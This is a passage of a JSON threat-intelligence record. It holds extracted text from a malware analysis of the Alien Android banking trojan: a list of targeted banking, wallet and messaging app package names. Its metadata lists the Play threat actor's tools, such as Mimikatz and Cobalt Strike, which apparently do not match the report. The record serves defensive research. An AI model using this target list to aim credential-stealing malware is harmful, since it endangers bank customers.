Bank Australia app\n\ncom.fusion.beyondbank Beyond Bank Australia\n\ncom.greater.greater \ncom.bancsabadell.wallet Sabadell Wallet\n\nes.bancosantander.wallet Santander Wallet\n\ncom.fullsix.android.labanquepostale.accountaccess La Banque Postale\n\ncom.cajamar.cajamar \nwit.android.bcpbankingapp.millennium \nenterprise.com.anz.shield ANZ Shield\n\ncom.fibabanka.mobile Fibabanka Corporate Mobile\n\ncom.mobileloft.alpha.droid myAlpha Mobile\n\nmbanking.nbg \ncom.eurobankefg \nes.bancopopular.nbmpopular Popular\n\nktbcs.netbank Krungthai NEXT\n\n\n-----\n\n**Package name** **App name**\n\ncom.bbva.bbvawallet BBVA Wallet Spain. Mobile Payment\n\ncom.bancomer.mbanking BBVA México (Bancomer Móvil)\n\nar.com.santander.rio.mbanking Santander Argentina\n\ncom.mercadolibre Mercado Libre: compra fácil y rápido\n\nes.santander.money Santander Money Plan\n\ncom.dhanlaxmi.dhansmart.mtc Dhanlaxmi Bank Mobile Banking\n\ncom.infrasofttech.centralbank \ncom.infrasofttech.mahabank \ncom.msf.kbank.mobile Kotak - 811 & Mobile Banking\n\ncom.sbi.sbanywherecorporate \ncom.snapwork.hdfc HDFC Bank MobileBanking\n\ncom.samba.mb SambaMobile\n\neu.netinfo.colpatria.system Scotiabank Colpatria\n\ncom.todo1.mobile Bancolombia App Personas\n\norg.westpac.bank Westpac Mobile Banking\n\nau.com.suncorp.suncorpbank \nau.com.pnbank.android P&N BANKING APP\n\ncom.ing.mobile ING Bankieren\n\ncom.tfkb Türkiye Finans Mobile Branch\n\nfinansbank.enpara.sirketim Enpara.com Şirketim Cep Şubesi\n\ncom.google.android.play.games Google Play Games\n\ncom.icomvision.bsc.tbc TBC Bank\n\ncom.citi.citimobile Citi Mobile®\n\ncom.tdbank TD Bank (US)\n\ncom.unionbank.ecommerce.mobile.android Union Bank Mobile Banking\n\ncom.comarch.security.mobilebanking ING Business\n\nde.sdvrz.ihb.mobile.secureapp.sparda.produktion SpardaSecureApp\n\nau.com.bankwest.mobile Bankwest\n\ncom.hsbc.hsbcnet HSBCnet Mobile\n\ncom.nearform.ptsb permanent tsb\n\norg.banking.bom.businessconnect Bank of Melbourne Business App\n\norg.banking.bsa.businessconnect BankSA Business App\n\norg.banking.stg.businessconnect St.George Business App\n\norg.westpac.col Westpac Corporate Mobile\n\nca.bnc.android National Bank of Canada\n\nca.servus.mbanking Servus Mobile Banking\n\nco.bitx.android.wallet Luno: Buy Bitcoin, Ethereum and Cryptocurrency\n\ncom.acceltree.mtc.screens Alawwal Mobile\n\nenbd.mobilebanking Emirates NBD\n\n\n-----\n\n**Package name** **App name**\n\nlt.spectrofinance.spectrocoin.android.wallet Bitcoin Wallet by SpectroCoin\n\ncom.skype.raider Skype - free IM & video calls\n\ncom.barclaycardus Barclays US\n\ncom.grppl.android.shell.bos \ncom.rbs.mobile.android.natwest NatWest Mobile Banking\n\ncom.rbs.mobile.android.rbs Royal Bank of Scotland Mobile Banking\n\ntsb.mobilebanking TSB Bank Mobile Banking\n\nnet.inverline.bancosabadell.officelocator.activobank ActivoBank\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2020/2020-09-24 - Alien - the story of Cerberus' demise.pdf"
    ],
    "report_names": [
        "2020-09-24 - Alien - the story of Cerberus' demise.pdf"
    ],
    "threat_actors": [
        {
            "id": "75108fc1-7f6a-450e-b024-10284f3f62bb",
            "created_at": "2024-11-01T02:00:52.756877Z",
            "updated_at": "2025-03-27T02:00:55.544216Z",
            "deleted_at": null,
            "main_name": "Play",
            "aliases": null,
            "source_name": "MITRE:Play",
            "tools": [
                "Nltest",
                "AdFind",
                "PsExec",
                "Wevtutil",
                "Cobalt Strike",
                "Playcrypt",
                "Mimikatz"
            ],
            "source_id": "MITRE",
            "reports": null
        }
    ],
    "ts_created_at": 1673535889,
    "ts_updated_at": 1743041785,
    "ts_creation_date": 1653781171,
    "ts_modification_date": 1653781171,
    "files": {
        "pdf": "https://archive.orkl.eu/c3256121b06b7f2220dc336aea94f7bccf4f6074.pdf",
        "text": "https://archive.orkl.eu/c3256121b06b7f2220dc336aea94f7bccf4f6074.txt",
        "img": "https://archive.orkl.eu/c3256121b06b7f2220dc336aea94f7bccf4f6074.jpg"
    }
}